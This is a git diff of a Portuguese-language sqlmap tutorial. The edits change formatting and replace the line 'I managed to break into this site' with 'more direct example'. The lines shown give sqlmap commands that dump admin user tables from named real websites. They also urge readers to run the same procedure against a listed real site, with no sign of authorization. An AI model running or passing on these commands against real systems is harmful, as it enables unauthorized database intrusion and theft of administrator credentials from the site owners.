@@ -254,7 +254,7 @@ $ python sqlmap.py -u http://www.thailandquitline.or.th/news.php?id=1 -D admin_n
 
 Obs: **-D** *admin_nd* **-T** *admin*, define que queremos trabalhar com a tabela *admin* da database *admin_nd*.
 
-Obs²: com --dump pedidos para o sqlmap nos mostrar o conteúdo desta tabela.
+Obs²: com <code>--dump</code> pedidos para o sqlmap nos mostrar o conteúdo desta tabela.
 
 Resultado:
 
@@ -278,7 +278,7 @@ Experimente fazer esses procedimentos com esses sites:
 * http://www.mediations.ch/cms/news.php?id=10
 
 
-Consegui invadir esse site: http://www.stonetouch.ch/
+Exemplo mais direto: http://www.stonetouch.ch/
 
 ```
 $ python sqlmap.py -u http://www.stonetouch.ch/news.php?id=9 -D c_bohnet_stonetouch-english -T wk_admin_user --dump -v0
